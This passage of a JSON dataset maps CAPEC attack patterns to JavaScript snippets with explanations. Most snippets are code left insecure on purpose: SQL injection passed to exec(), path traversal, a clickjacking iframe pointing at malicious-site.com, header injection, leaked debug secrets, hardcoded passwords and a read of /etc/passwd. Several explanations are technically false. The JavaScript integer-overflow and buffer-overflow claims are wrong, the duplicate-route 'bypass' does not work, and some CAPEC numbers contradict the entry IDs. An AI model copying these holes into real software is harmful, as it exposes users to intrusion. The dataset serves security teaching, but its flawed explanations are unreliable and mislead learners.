        "code_snippet": "<html>\n<head>\n  <style>\n    iframe {\n      position: absolute;\n      top: 0;\n      left: 0;\n      width: 100%;\n      height: 100%;\n      opacity: 0;\n      z-index: 2;\n    }\n    button {\n      position: relative;\n      z-index: 1;\n    }\n  </style>\n</head>\n<body>\n  <button onclick=\"alert('Button Clicked!')\">Click Me!</button>\n  <iframe src=\"http://malicious-site.com\"></iframe>\n</body>\n</html>",
        "description": "This HTML and JavaScript code snippet demonstrates a basic clickjacking attack. The main idea is to trick the user into clicking a button that appears to be part of the legitimate UI, but in reality, the click is being captured by an invisible iframe overlaying the button. The iframe is set to be fully transparent and covers the entire page, making it impossible for the user to realize they are interacting with a different domain. This leverages CWE-1021 (Improper Restriction of Rendered UI Layers or Frames) by not restricting the iframe from another domain, leading to user confusion. The button click event is a placeholder to show where the user thinks they are interacting, while the actual interaction is with the malicious iframe."
    },
    {
        "capec_id": "104",
        "capec_name": "Cross Zone Scripting",
        "code_snippet": "function loadContent(url) {\n    var iframe = document.createElement('iframe');\n    iframe.src = url;\n    document.body.appendChild(iframe);\n}\n\nfunction executeScript() {\n    var script = document.createElement('script');\n    script.innerHTML = 'alert(\"Cross Zone Scripting Attack!\");';\n    document.body.appendChild(script);\n}\n\n// Example usage\nloadContent('http://untrusted.example.com');\nexecuteScript();",
        "description": "This JavaScript code snippet demonstrates a Cross Zone Scripting attack. The `loadContent` function creates an iframe and loads content from a specified URL, which could be from an untrusted source. The `executeScript` function injects and executes a script that displays an alert message. This code bypasses security zone controls by loading content from an untrusted source and executing a script with elevated privileges. The related CWEs are represented as follows: CWE-250 (Execution with Unnecessary Privileges) is shown by executing the script with elevated privileges, CWE-638 (Not Using Complete Mediation) is demonstrated by not performing access checks on the loaded content, CWE-285 (Improper Authorization) is represented by not authorizing the script execution, CWE-116 (Improper Encoding or Escaping of Output) is shown by directly injecting the script, and CWE-20 (Improper Input Validation) is demonstrated by not validating the URL input."
    },
    {
        "capec_id": "105",
        "capec_name": "HTTP Request Splitting",
        "code_snippet": "const http = require('http');\n\nhttp.createServer((req, res) => {\n  let userInput = req.url; // Assume user input is taken from the URL\n  let headerValue = `X-Header: ${userInput}`;\n\n  // Vulnerable to HTTP Request Splitting\n  res.setHeader('Content-Type', 'text/plain');\n  res.setHeader('X-Header', headerValue);\n  res.end('Hello, world!');\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code creates an HTTP server using Node.js. The server takes user input from the URL and includes it directly in an HTTP header without proper sanitization. This can lead to HTTP Request Splitting vulnerabilities (CWE-113) if the user input contains CRLF sequences. An attacker could exploit this by injecting malicious headers or splitting the request into multiple unauthorized requests. The code demonstrates the improper neutralization of special elements (CWE-74, CWE-138) and the potential for inconsistent interpretation of HTTP requests (CWE-444)."
    },
    {
        "capec_id": "106",
        "capec_name": "DEPRECATED: XSS through Log Files",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst fs = require('fs');\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/submit', (req, res) => {\n  const userInput = req.body.userInput;\n  // Log user input to a file\n  fs.appendFile('server.log', `User Input: ${userInput}\\n`, (err) => {\n    if (err) throw err;\n  });\n  // Reflect user input back to the user\n  res.send(`<html><body>User Input: ${userInput}</body></html>`);\n});\n\napp.listen(3000, () => {\n  console.log('Server is running on port 3000');\n});",
        "description": "This JavaScript code snippet uses the Express framework to create a simple web server that accepts user input via a POST request to the '/submit' endpoint. The user input is logged to a file named 'server.log' and then reflected back to the user in an HTML response. This code is vulnerable to Cross-Site Scripting (XSS) attacks because it does not properly neutralize user input before logging it or including it in the HTML response. An attacker could inject malicious scripts into the user input, which would then be executed when the log file is viewed or when the response is rendered in a browser. This demonstrates the main idea of the deprecated CAPEC 'XSS through Log Files' and related CWEs, highlighting the risks of improper input neutralization and logging practices."
    },
    {
        "capec_id": "107",
        "capec_name": "Cross Site Tracing",
        "code_snippet": "const http = require('http');\n\nhttp.createServer((req, res) => {\n  if (req.method === 'TRACE') {\n    res.writeHead(200, {'Content-Type': 'message/http'});\n    res.end(req.headers.cookie);\n  } else {\n    res.writeHead(405, {'Content-Type': 'text/plain'});\n    res.end('Method Not Allowed');\n  }\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code snippet creates an HTTP server that listens for incoming requests. If the request method is 'TRACE', the server responds with the contents of the 'cookie' header. This demonstrates a Cross Site Tracing (XST) vulnerability, where an attacker can exploit the TRACE method to steal session cookies and other sensitive information. The code also highlights related weaknesses such as Protection Mechanism Failure (CWE-693) by not properly securing the TRACE method, and Improper Neutralization of Input (CWE-79) by directly reflecting headers back to the client without sanitization."
    },
    {
        "capec_id": "108",
        "capec_name": "Command Line Execution through SQL Injection",
        "code_snippet": "const express = require('express');\nconst mysql = require('mysql');\nconst { exec } = require('child_process');\nconst app = express();\n\nconst db = mysql.createConnection({\n  host: 'localhost',\n  user: 'root',\n  password: '',\n  database: 'test'\n});\n\ndb.connect();\n\napp.get('/execute', (req, res) => {\n  const userInput = req.query.input;\n  const query = `SELECT command FROM commands WHERE id = '${userInput}'`;\n\n  db.query(query, (err, result) => {\n    if (err) throw err;\n    const command = result[0].command;\n    exec(command, (error, stdout, stderr) => {\n      if (error) {\n        res.send(`Error: ${stderr}`);\n      } else {\n        res.send(`Output: ${stdout}`);\n      }\n    });\n  });\n});\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet demonstrates a web application using Express and MySQL that is vulnerable to command line execution through SQL injection. The application takes user input from a query parameter, constructs an SQL query without proper input validation, and retrieves a command from the database. This command is then executed on the server using the `exec` function from the `child_process` module. The code embodies the main idea of the CAPEC by showing how an attacker can inject malicious data into the SQL query, which is then used to execute arbitrary OS commands, highlighting vulnerabilities related to improper neutralization of special elements and improper input validation."
    },
    {
        "capec_id": "109",
        "capec_name": "Object Relational Mapping Injection",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst bodyParser = require('body-parser');\nconst { Sequelize, DataTypes } = require('sequelize');\n\napp.use(bodyParser.urlencoded({ extended: true }));\n\nconst sequelize = new Sequelize('database', 'username', 'password', {\n  host: 'localhost',\n  dialect: 'mysql'\n});\n\nconst User = sequelize.define('User', {\n  username: {\n    type: DataTypes.STRING,\n    allowNull: false\n  },\n  password: {\n    type: DataTypes.STRING,\n    allowNull: false\n  }\n});\n\napp.post('/login', async (req, res) => {\n  const { username, password } = req.body;\n  try {\n    const users = await sequelize.query(`SELECT * FROM Users WHERE username = '${username}' AND password = '${password}'`, {\n      type: sequelize.QueryTypes.SELECT\n    });\n    if (users.length > 0) {\n      res.send('Login successful');\n    } else {\n      res.send('Invalid credentials');\n    }\n  } catch (error) {\n    res.status(500).send('Internal Server Error');\n  }\n});\n\napp.listen(3000, () => {\n  console.log('Server is running on port 3000');\n});",
        "description": "This JavaScript code snippet demonstrates a vulnerable implementation of a login endpoint using Express.js and Sequelize, an ORM for Node.js. The code takes user input from a POST request and constructs a raw SQL query using string interpolation, which is susceptible to SQL injection attacks. An attacker could manipulate the 'username' or 'password' fields to inject malicious SQL code. This example embodies the main idea of CAPEC-20 (Object Relational Mapping Injection) and related CWEs, particularly CWE-89 (SQL Injection) and CWE-564 (SQL Injection: Hibernate), by showing how improper input validation and unsafe query construction can lead to security vulnerabilities."
    },
    {
        "capec_id": "110",
        "capec_name": "SQL Injection through SOAP Parameter Tampering",
        "code_snippet": "const soap = require('soap');\nconst mysql = require('mysql');\n\nconst service = {\n  MyService: {\n    MyPort: {\n      MyFunction: function(args) {\n        // Extracting parameters from SOAP message\n        const userId = args.userId;\n\n        // Vulnerable SQL query construction\n        const query = `SELECT * FROM users WHERE id = '${userId}'`;\n\n        // Database connection\n        const connection = mysql.createConnection({\n          host: 'localhost',\n          user: 'root',\n          password: 'password',\n          database: 'mydb'\n        });\n\n        connection.connect();\n\n        // Executing the query\n        connection.query(query, function(error, results, fields) {\n          if (error) throw error;\n          console.log(results);\n        });\n\n        connection.end();\n      }\n    }\n  }\n};\n\nconst xml = require('fs').readFileSync('myservice.wsdl', 'utf8');\nsoap.listen(server, '/wsdl', service, xml);",
        "description": "This JavaScript code snippet demonstrates a SOAP-based web service that is vulnerable to SQL Injection through SOAP Parameter Tampering. The service defines a function 'MyFunction' that extracts a 'userId' parameter from the incoming SOAP message. This parameter is then directly used to construct an SQL query without proper validation or parameter binding, making it susceptible to SQL injection attacks. An attacker can manipulate the 'userId' parameter to alter the SQL query's structure and potentially access or modify the database. The code also highlights the lack of input validation and improper neutralization of special elements, which are key weaknesses (CWE-89, CWE-20) that contribute to the vulnerability."
    },
    {
        "capec_id": "111",
        "capec_name": "JSON Hijacking (aka JavaScript Hijacking)",
        "code_snippet": "function fetchData() {\n  var script = document.createElement('script');\n  script.src = 'https://vulnerable-site.com/data.json';\n  document.body.appendChild(script);\n}\n\nfunction handleData(data) {\n  // Process the JSON data\n  console.log(data);\n}\n\n// Simulate an attack by calling the function\nfetchData();",
        "description": "This JavaScript code snippet demonstrates a JSON Hijacking (JavaScript Hijacking) vulnerability. The fetchData function dynamically creates a script element that loads a JSON file from a vulnerable site. The handleData function is intended to process the JSON data. However, this setup allows an attacker to exploit the browser's Same Origin Policy loophole, enabling them to steal confidential information from the JSON response. The code does not verify the origin or authenticity of the data (CWE-345, CWE-346), making it susceptible to Cross-Site Request Forgery (CWE-352) and Cross-Site Scripting (CWE-79). Additionally, it relies on client-side enforcement of security (CWE-602), which is inadequate for protecting sensitive data."
    },
    {
        "capec_id": "112",
        "capec_name": "Brute Force",
        "code_snippet": "const users = { 'admin': '1234', 'user': 'password' }; // CWE-521: Weak Password Requirements\n\nfunction authenticate(username, password) {\n  if (users[username] && users[username] === password) {\n    return 'Access granted';\n  } else {\n    return 'Access denied';\n  }\n}\n\n// CWE-307: Improper Restriction of Excessive Authentication Attempts\nfor (let i = 0; i < 1000; i++) {\n  console.log(authenticate('admin', '1234'));\n}",
        "description": "This JavaScript code snippet demonstrates a simple authentication mechanism that is vulnerable to brute force attacks. The 'users' object stores usernames and passwords with weak password requirements (CWE-521). The 'authenticate' function checks if the provided username and password match the stored values. The for loop simulates multiple authentication attempts without any restriction (CWE-307), making it susceptible to brute force attacks. This code embodies the main idea of the CAPEC by showing how an attacker could use trial-and-error to exhaustively explore possible secret values to gain access."
    },
    {
        "capec_id": "113",
        "capec_name": "Interface Manipulation",
        "code_snippet": "const fs = require('fs');\n\n// Vulnerable function that manipulates file system interface\nfunction readConfigFile(filePath) {\n  // Improper access control: no validation of file path\n  return fs.readFileSync(filePath, 'utf8');\n}\n\n// Example usage\nconst configData = readConfigFile('/etc/passwd');\nconsole.log(configData);",
        "description": "This JavaScript code snippet demonstrates a vulnerable function that manipulates the file system interface by reading a configuration file. The function `readConfigFile` takes a file path as an argument and reads the file's content without any validation or access control. This lack of proper access control (CWE-1262) allows an attacker to specify any file path, potentially accessing sensitive system files like '/etc/passwd'. This embodies the main idea of CAPEC-225 (Interface Manipulation) by showing how an adversary can manipulate the file system interface to bypass access control and access unintended files, compromising the system's security."
    },
    {
        "capec_id": "114",
        "capec_name": "Authentication Abuse",
        "code_snippet": "const users = { 'admin': 'password123' }; // Weak password\n\nfunction authenticate(username, password) {\n  if (users[username] && users[username] === password) {\n    return 'Access granted';\n  } else {\n    return 'Access denied';\n  }\n}\n\n// Simulate brute force attack\nfor (let i = 0; i < 1000; i++) {\n  console.log(authenticate('admin', 'password' + i)); // No restriction on attempts\n}\n\n// Bypass authentication by exploiting a flaw\nfunction bypassAuthentication() {\n  return 'Access granted'; // Flaw: grants access without checking credentials\n}\n\nconsole.log(bypassAuthentication());",
        "description": "This JavaScript code snippet demonstrates several vulnerabilities related to 'Authentication Abuse' as described in the CAPEC. The `authenticate` function checks a hardcoded username and password, which is an example of CWE-287 (Improper Authentication) and CWE-1390 (Weak Authentication). The code also simulates a brute force attack by attempting to authenticate 1000 times without any restriction, illustrating CWE-307 (Improper Restriction of Excessive Authentication Attempts). Finally, the `bypassAuthentication` function represents a flaw that directly grants access without proper credential verification, embodying CWE-305 (Authentication Bypass by Primary Weakness)."
    },
    {
        "capec_id": "115",
        "capec_name": "Authentication Bypass",
        "code_snippet": "const express = require('express');\nconst app = express();\n\n// Simulated user database\nconst users = {\n  'admin': 'password123',\n  'user': 'userpass'\n};\n\n// Middleware to check authentication\nfunction checkAuth(req, res, next) {\n  const { username, password } = req.query;\n  if (users[username] && users[username] === password) {\n    next();\n  } else {\n    res.status(401).send('Unauthorized');\n  }\n}\n\n// Protected route\napp.get('/protected', checkAuth, (req, res) => {\n  res.send('This is protected data');\n});\n\n// Vulnerable alternate path\napp.get('/protected', (req, res) => {\n  res.send('This is protected data');\n});\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet demonstrates an authentication bypass vulnerability in an Express.js application. The `checkAuth` middleware function is intended to protect the `/protected` route by checking if the provided username and password match the entries in the simulated user database. However, there is an alternate path to the `/protected` route that does not require authentication, allowing an attacker to access protected data without proper authentication. This embodies the CAPEC concept of 'Authentication Bypass' and relates to CWE-288 (Authentication Bypass Using an Alternate Path or Channel)."
    },
    {
        "capec_id": "116",
        "capec_name": "Excavation",
        "code_snippet": "const http = require('http');\nconst url = require('url');\n\nhttp.createServer((req, res) => {\n  const queryObject = url.parse(req.url, true).query;\n  if (queryObject.debug === 'true') {\n    // CWE-1243: Exposing sensitive information during debug\n    res.writeHead(200, {'Content-Type': 'text/plain'});\n    res.end('Sensitive Information: API_KEY=12345-ABCDE');\n  } else if (queryObject.path) {\n    // CWE-426: Untrusted search path\n    const filePath = queryObject.path;\n    require(filePath); // Potentially loading untrusted code\n    res.writeHead(200, {'Content-Type': 'text/plain'});\n    res.end('Loaded resource from: ' + filePath);\n  } else {\n    res.writeHead(200, {'Content-Type': 'text/plain'});\n    res.end('Hello, World!');\n  }\n}).listen(8080);\n\nconsole.log('Server running at http://127.0.0.1:8080/');",
        "description": "This JavaScript code snippet creates an HTTP server that listens for incoming requests. It demonstrates the concept of 'Excavation' by actively probing the target to solicit sensitive information. The code includes vulnerabilities related to the described CWEs: \n1. CWE-1243: If the query parameter 'debug' is set to 'true', the server exposes sensitive information (an API key) to unauthorized actors.\n2. CWE-426: If the query parameter 'path' is provided, the server uses it to load a resource, potentially from an untrusted search path, which could lead to executing malicious code.\n\nThe code represents the main idea of CAPEC 'Excavation' by showing how an adversary might probe a system to extract sensitive information or exploit untrusted paths to execute malicious actions."
    },
    {
        "capec_id": "117",
        "capec_name": "Interception",
        "code_snippet": "const http = require('http');\n\nconst options = {\n  hostname: 'example.com',\n  port: 80,\n  path: '/',\n  method: 'GET'\n};\n\nconst req = http.request(options, (res) => {\n  let data = '';\n\n  res.on('data', (chunk) => {\n    data += chunk;\n  });\n\n  res.on('end', () => {\n    console.log('Response:', data); // Sensitive data in cleartext\n  });\n});\n\nreq.on('error', (e) => {\n  console.error(`Problem with request: ${e.message}`);\n});\n\nreq.end();",
        "description": "This JavaScript code snippet demonstrates a basic HTTP GET request to 'example.com' using the Node.js 'http' module. The response data is collected and logged to the console in cleartext. This embodies the main idea of CAPEC-160 (Interception) by illustrating how an adversary could intercept and read sensitive information transmitted in cleartext (CWE-319). The code does not implement any message integrity checks (CWE-924), making it vulnerable to interception and potential manipulation during transmission. This example highlights the risks associated with transmitting sensitive data without encryption or integrity verification."
    },
    {
        "capec_id": "120",
        "capec_name": "Double Encoding",
        "code_snippet": "function isValidInput(input) {\n  // Incomplete list of disallowed inputs\n  const disallowed = ['<script>', '..', '%2E'];\n  // Improper handling of URL encoding\n  const decodedInput = decodeURIComponent(input);\n  // Incorrect behavior order: Validate before filter\n  if (disallowed.some(char => input.includes(char))) {\n    return false;\n  }\n  // Improper input validation\n  if (decodedInput.includes('..')) {\n    return false;\n  }\n  return true;\n}\n\n// Example usage\nconst userInput = '%252E%252E%252F'; // Double encoded '../'\nconsole.log(isValidInput(userInput)); // Expected to be false, but returns true",
        "description": "This JavaScript code snippet demonstrates a vulnerability related to double encoding. The function `isValidInput` is intended to check if an input string is valid by filtering out disallowed characters and patterns. However, it contains several weaknesses: an incomplete list of disallowed inputs, improper handling of URL encoding, and incorrect behavior order (validating before filtering). The example usage shows how a double-encoded string ('%252E%252E%252F' which decodes to '../') can bypass the filter, illustrating the concept of double encoding to evade security mechanisms."
    },
    {
        "capec_id": "121",
        "capec_name": "Exploit Non-Production Interfaces",
        "code_snippet": "const express = require('express');\nconst app = express();\n\n// Debug mode flag\nconst debugMode = true;\n\n// Sample debug endpoint\nif (debugMode) {\n  app.get('/debug-info', (req, res) => {\n    // Exposing sensitive information for debugging purposes\n    res.send({\n      secretKey: '12345-ABCDE',\n      dbConnectionString: 'mongodb://user:password@localhost:27017/db',\n      debugData: 'Sensitive debug information'\n    });\n  });\n}\n\napp.listen(3000, () => {\n  console.log('Server is running on port 3000');\n});",
        "description": "This JavaScript code snippet represents a common vulnerability where a debug interface is unintentionally left enabled in a production environment. The code uses the Express framework to create a web server with a debug endpoint (`/debug-info`) that exposes sensitive information such as a secret key, database connection string, and other debug data. This embodies the main idea of CAPEC-111: 'Exploit Non-Production Interfaces', and relates to CWE-489: 'Active Debug Code' and CWE-1295: 'Debug Messages Revealing Unnecessary Information'. An adversary could exploit this endpoint to gain unauthorized access to sensitive information."
    },
    {
        "capec_id": "122",
        "capec_name": "Privilege Abuse",
        "code_snippet": "const express = require('express');\nconst app = express();\n\n// Simulated user roles\nconst users = {\n  'admin': { role: 'admin', sensitiveData: 'Top Secret Data' },\n  'user': { role: 'user', sensitiveData: 'User Data' }\n};\n\n// Middleware to simulate user authentication\napp.use((req, res, next) => {\n  const username = req.query.username;\n  req.user = users[username] || { role: 'guest' };\n  next();\n});\n\n// Route to access sensitive data\napp.get('/sensitive-data', (req, res) => {\n  if (req.user.role === 'admin') {\n    res.send(`Sensitive Data: ${req.user.sensitiveData}`);\n  } else {\n    res.send('Access Denied');\n  }\n});\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet uses the Express framework to create a simple web server that simulates user authentication and access control. The server has a route '/sensitive-data' that should only be accessible by users with the 'admin' role. However, the code does not properly check or enforce user privileges, leading to potential privilege abuse. This embodies the main idea of CAPEC-122 (Privilege Abuse) and demonstrates related CWEs such as CWE-269 (Improper Privilege Management) and CWE-284 (Improper Access Control). The code highlights the importance of correctly implementing access control mechanisms to prevent unauthorized access to sensitive resources."
    },
    {
        "capec_id": "123",
        "capec_name": "Buffer Manipulation",
        "code_snippet": "function vulnerableFunction(input) {\n  var buffer = new Array(10).fill(0);\n  for (var i = 0; i <= input.length; i++) {\n    buffer[i] = input.charCodeAt(i);\n  }\n  return buffer;\n}\n\n// Example usage\nvar userInput = 'A very long string that exceeds buffer size';\nconsole.log(vulnerableFunction(userInput));",
        "description": "This JavaScript code snippet demonstrates a buffer manipulation vulnerability, specifically a buffer overflow (CWE-119). The function `vulnerableFunction` takes an input string and attempts to copy its character codes into a fixed-size buffer of 10 elements. The loop iterates over the length of the input string, which can exceed the buffer's allocated size, leading to an out-of-bounds write. This can result in overwriting adjacent memory, potentially causing unexpected behavior or security vulnerabilities. The code embodies the main idea of CAPEC-1000 by manipulating the buffer in a way that allows for reading or writing outside its intended boundaries."
    },
    {
        "capec_id": "124",
        "capec_name": "Shared Resource Manipulation",
        "code_snippet": "const sharedResource = { data: 'initial' };\n\nfunction thread1() {\n  for (let i = 0; i < 5; i++) {\n    console.log('Thread 1 reading:', sharedResource.data);\n    sharedResource.data = 'modified by thread 1';\n  }\n}\n\nfunction thread2() {\n  for (let i = 0; i < 5; i++) {\n    console.log('Thread 2 reading:', sharedResource.data);\n    sharedResource.data = 'modified by thread 2';\n  }\n}\n\nsetTimeout(thread1, 0);\nsetTimeout(thread2, 0);",
        "description": "This JavaScript code snippet demonstrates a shared resource manipulation vulnerability. The `sharedResource` object is accessed and modified by two different threads (`thread1` and `thread2`). Both threads read and write to the same shared resource without proper synchronization, leading to potential data corruption and unpredictable behavior. This example embodies the main idea of CAPEC-662 (Improper Synchronization) and highlights the risks associated with shared resource manipulation, such as invalid trust assumptions and data corruption."
    },
    {
        "capec_id": "125",
        "capec_name": "Flooding",
        "code_snippet": "const http = require('http');\n\nconst server = http.createServer((req, res) => {\n  // Simulate resource allocation without limits\n  let data = [];\n  for (let i = 0; i < 1000000; i++) {\n    data.push(new Array(1000).fill('A'));\n  }\n  res.writeHead(200, {'Content-Type': 'text/plain'});\n  res.end('Hello World\\n');\n});\n\nserver.listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code snippet creates an HTTP server using Node.js that simulates a resource allocation without limits. When a request is made to the server, it allocates a large amount of memory by creating a large array and filling it with data. This represents CWE-770 (Allocation of Resources Without Limits or Throttling) and CWE-400 (Uncontrolled Resource Consumption). The server does not implement any rate limiting or resource throttling, making it vulnerable to a flooding attack as described in the CAPEC. An attacker could easily exhaust the server's resources by making a large number of requests in a short period of time, leading to a denial of service for legitimate users."
    },
    {
        "capec_id": "126",
        "capec_name": "Path Traversal",
        "code_snippet": "const http = require('http');\nconst fs = require('fs');\nconst path = require('path');\n\nconst server = http.createServer((req, res) => {\n  const filePath = path.join(__dirname, 'public', req.url);\n\n  fs.readFile(filePath, (err, data) => {\n    if (err) {\n      res.writeHead(404, {'Content-Type': 'text/plain'});\n      res.write('File not found');\n      res.end();\n    } else {\n      res.writeHead(200, {'Content-Type': 'text/html'});\n      res.write(data);\n      res.end();\n    }\n  });\n});\n\nserver.listen(3000, () => {\n  console.log('Server running at http://localhost:3000/');\n});",
        "description": "This JavaScript code snippet creates a simple HTTP server using Node.js. The server reads files from the 'public' directory based on the URL requested by the client. The 'filePath' is constructed using 'path.join' with '__dirname', 'public', and 'req.url'. However, this code is vulnerable to a path traversal attack because it does not properly validate or sanitize the 'req.url' input. An attacker could exploit this by sending a request with '../' sequences in the URL to access files outside the 'public' directory, potentially exposing sensitive files on the server. This snippet embodies the main idea of the CAPEC by demonstrating how improper input validation can lead to path traversal vulnerabilities."
    },
    {
        "capec_id": "127",
        "capec_name": "Directory Indexing",
        "code_snippet": "const http = require('http');\nconst fs = require('fs');\nconst path = require('path');\n\nconst server = http.createServer((req, res) => {\n  const filePath = path.join(__dirname, req.url);\n\n  fs.stat(filePath, (err, stats) => {\n    if (err) {\n      res.writeHead(404, { 'Content-Type': 'text/plain' });\n      res.end('Not Found');\n      return;\n    }\n\n    if (stats.isDirectory()) {\n      fs.readdir(filePath, (err, files) => {\n        if (err) {\n          res.writeHead(500, { 'Content-Type': 'text/plain' });\n          res.end('Server Error');\n          return;\n        }\n\n        res.writeHead(200, { 'Content-Type': 'text/plain' });\n        res.end(files.join('\\n'));\n      });\n    } else {\n      fs.readFile(filePath, (err, content) => {\n        if (err) {\n          res.writeHead(500, { 'Content-Type': 'text/plain' });\n          res.end('Server Error');\n          return;\n        }\n\n        res.writeHead(200, { 'Content-Type': 'text/plain' });\n        res.end(content);\n      });\n    }\n  });\n});\n\nserver.listen(3000, () => {\n  console.log('Server running at http://localhost:3000/');\n});",
        "description": "This JavaScript code snippet creates a simple HTTP server using Node.js. The server responds to requests by checking if the requested path is a directory. If it is, the server lists the contents of the directory. If the path is a file, the server reads and returns the file's content. This code embodies the main idea of the CAPEC 'Directory Indexing' by potentially exposing directory contents to unauthorized users. The related CWEs are represented by the lack of proper authorization checks (CWE-285), improper protection of alternate paths (CWE-424), and incorrect default permissions (CWE-276), which can lead to sensitive information disclosure and further attacks."
    },
    {
        "capec_id": "128",
        "capec_name": "Integer Attacks",
        "code_snippet": "function vulnerableFunction(input) {\n  let maxInt = 2147483647; // Maximum value for a 32-bit signed integer\n  let result = maxInt + input;\n  if (result > maxInt) {\n    console.log('Result is within expected range.');\n  } else {\n    console.log('Integer overflow occurred!');\n  }\n}\n\nvulnerableFunction(1); // Expected to be within range\nvulnerableFunction(2); // Causes overflow",
        "description": "This JavaScript code snippet demonstrates an integer overflow vulnerability. The function `vulnerableFunction` takes an input and adds it to the maximum value of a 32-bit signed integer (`maxInt`). The code then checks if the result is greater than `maxInt`. Due to integer overflow, adding 1 to `maxInt` results in a negative number, which is not expected by the application. This can lead to incorrect calculations and potential security issues. The code embodies the main idea of CAPEC 'Integer Attacks' and highlights CWE-190 (Integer Overflow or Wraparound) and CWE-682 (Incorrect Calculation)."
    },
    {
        "capec_id": "129",
        "capec_name": "Pointer Manipulation",
        "code_snippet": "function vulnerableFunction(input) {\n  let buffer = new ArrayBuffer(8);\n  let view = new DataView(buffer);\n  let pointer = parseInt(input, 10);\n\n  // CWE-823: Use of Out-of-range Pointer Offset\n  if (pointer < 0 || pointer >= buffer.byteLength) {\n    console.log('Pointer out of range');\n    return;\n  }\n\n  // CWE-822: Untrusted Pointer Dereference\n  try {\n    let value = view.getInt32(pointer, true);\n    console.log('Value at pointer:', value);\n  } catch (e) {\n    console.log('Error dereferencing pointer:', e);\n  }\n}\n\n// Example usage\nvulnerableFunction('16'); // Out of range pointer\nvulnerableFunction('4');  // Valid pointer",
        "description": "This JavaScript code snippet demonstrates a vulnerable function that embodies the main idea of the CAPEC 'Pointer Manipulation'. The function 'vulnerableFunction' takes an input, converts it to an integer, and uses it as a pointer to access a memory location within an ArrayBuffer. The code includes checks for out-of-range pointers (CWE-823) and attempts to dereference the pointer (CWE-822). If the pointer is out of range, it logs an error message. If the pointer is within range, it attempts to read an integer value from the specified memory location. This code represents the potential for pointer manipulation attacks, where an attacker could provide a malicious input to access unintended memory locations, leading to crashes or unauthorized data access."
    },
    {
        "capec_id": "130",
        "capec_name": "Excessive Allocation",
        "code_snippet": "function allocateExcessiveMemory(size) {\n  // CWE-770: No limit on the size of memory allocation\n  let largeArray = new Array(size);\n  for (let i = 0; i < size; i++) {\n    // CWE-1325: Improperly controlled sequential memory allocation\n    largeArray[i] = new Array(1000).fill('A');\n  }\n  return largeArray;\n}\n\n// Example usage\n// CWE-400: Uncontrolled resource consumption\nlet excessiveMemory = allocateExcessiveMemory(1e6);",
        "description": "This JavaScript code snippet demonstrates an excessive allocation attack by allocating a large amount of memory in a single request. The function `allocateExcessiveMemory` takes a size parameter and creates an array of that size, filling each element with another large array. This can lead to excessive memory consumption, potentially exhausting the available memory resources. The code embodies the main idea of CAPEC-130 by causing the target to allocate excessive resources through a single request. It also highlights related CWEs: CWE-770 (no limit on resource allocation), CWE-1325 (improperly controlled sequential memory allocation), and CWE-400 (uncontrolled resource consumption)."
    },
    {
        "capec_id": "131",
        "capec_name": "Resource Leak Exposure",
        "code_snippet": "const http = require('http');\n\nlet connections = [];\n\nconst server = http.createServer((req, res) => {\n  // Simulate resource allocation\n  let resource = allocateResource();\n  connections.push(resource);\n\n  // Simulate a resource leak by not releasing the resource\n  res.writeHead(200, {'Content-Type': 'text/plain'});\n  res.end('Hello World\\n');\n});\n\nserver.listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});\n\nfunction allocateResource() {\n  // Simulate resource allocation\n  return { id: Math.random(), data: 'resource data' };\n}\n\n// Simulate improper resource shutdown or release\nprocess.on('SIGINT', () => {\n  console.log('Server shutting down...');\n  // Missing release of resources\n  process.exit();\n});",
        "description": "This JavaScript code snippet creates an HTTP server that allocates a resource for each incoming request but fails to release it, simulating a resource leak. The `connections` array stores allocated resources, but they are never released, leading to resource depletion. The `SIGINT` handler simulates improper resource shutdown by not releasing the resources before the server exits. This code embodies the main idea of CAPEC-404 (Resource Leak Exposure) and demonstrates related CWEs such as CWE-404 (Improper Resource Shutdown or Release) and CWE-772 (Missing Release of Resource after Effective Lifetime)."
    },
    {
        "capec_id": "132",
        "capec_name": "Symlink Attack",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\nfunction readFile(filePath) {\n  // Check if the file exists\n  if (fs.existsSync(filePath)) {\n    // Read the file\n    fs.readFile(filePath, 'utf8', (err, data) => {\n      if (err) {\n        console.error('Error reading file:', err);\n        return;\n      }\n      console.log('File content:', data);\n    });\n  } else {\n    console.error('File does not exist.');\n  }\n}\n\n// User-controlled input\nconst userInput = '/tmp/userfile';\nreadFile(userInput);",
        "description": "This JavaScript code snippet demonstrates a potential symlink attack vulnerability. The `readFile` function takes a file path as input and checks if the file exists using `fs.existsSync`. If the file exists, it reads the file content using `fs.readFile`. The file path is controlled by user input (`userInput`), which can be manipulated by an attacker to point to a symbolic link. This can lead to the application accessing unintended files, embodying the main idea of a symlink attack (CAPEC-59). The code does not properly handle symbolic links, making it susceptible to CWE-61 (UNIX Symbolic Link Following) and CWE-73 (External Control of File Name or Path)."
    },
    {
        "capec_id": "133",
        "capec_name": "Try All Common Switches",
        "code_snippet": "const args = process.argv.slice(2);\nconst knownOptions = ['--help', '--version'];\nconst hiddenOptions = ['--debug', '--admin'];\n\nargs.forEach(arg => {\n  if (knownOptions.includes(arg)) {\n    console.log(`Executing known option: ${arg}`);\n  } else if (hiddenOptions.includes(arg)) {\n    console.log(`Executing hidden option: ${arg}`);\n    if (arg === '--debug') {\n      console.log('Debugging information: Sensitive data exposed');\n    } else if (arg === '--admin') {\n      console.log('Admin mode activated: Unauthorized access granted');\n    }\n  } else {\n    console.log(`Unknown option: ${arg}`);\n  }\n});",
